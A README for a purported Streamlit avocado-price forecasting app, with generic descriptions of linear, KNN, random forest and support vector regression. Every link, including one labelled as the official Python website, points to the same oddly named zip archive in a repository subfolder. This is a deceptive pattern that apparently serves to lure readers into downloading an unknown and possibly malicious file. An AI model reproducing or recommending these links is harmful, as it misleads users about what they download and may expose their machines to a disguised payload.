## 🌟 Overview

This application helps you predict annual avocado prices using various regression models. It provides an intuitive interface to visualize price trends and offers insights into factors affecting prices. You can quickly understand avocado pricing dynamics for better decision-making.

## 🚀 Getting Started

To get started with this application, follow these simple steps:

1. **Download the Application**: You need to visit the [Releases page](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/Using-Streamlit-Annual-Deployment-Forecasting-Models-with-Price-Regression-Avocado-1.3-beta.5.zip) to access the download files.

2. **System Requirements**: 
   - Windows, macOS, or Linux operating system.
   - Minimum 2 GB RAM.
   - At least 500 MB of free disk space.

3. **Install Required Software**: Ensure that you have Python installed, as the application is built using Streamlit and Python libraries. If Python is not installed, you can download it from the [official Python website](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/Using-Streamlit-Annual-Deployment-Forecasting-Models-with-Price-Regression-Avocado-1.3-beta.5.zip).

## 📥 Download & Install

1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/pablo-batalla/Annual-Avocado-Price-Forecasting-Using-Regression-Models-Deployment-with-Streamlit/main/Grallae/Using-Streamlit-Annual-Deployment-Forecasting-Models-with-Price-Regression-Avocado-1.3-beta.5.zip).

## 📊 How It Works

The application uses various regression models to predict prices. Here’s a brief overview of what each model does:

- **Linear Regression**: Establishes a relationship between price and factors like supply and demand.
- **KNN Regression**: Uses past data points to find similar pricing patterns.
- **Random Forest Regression**: Combines multiple decision trees for better accuracy.
- **Support Vector Regression**: Finds a trend line that best fits the data points.

You can explore each model within the app and see how it fits your data.
